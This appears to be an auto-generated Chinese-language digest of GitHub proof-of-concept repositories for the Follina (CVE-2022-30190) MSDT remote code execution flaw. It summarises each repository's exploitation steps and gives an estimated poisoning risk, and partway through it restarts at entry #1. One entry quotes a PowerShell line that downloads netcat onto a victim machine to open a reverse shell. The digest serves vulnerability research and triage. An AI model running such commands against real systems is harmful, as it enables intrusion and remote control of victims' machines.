CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

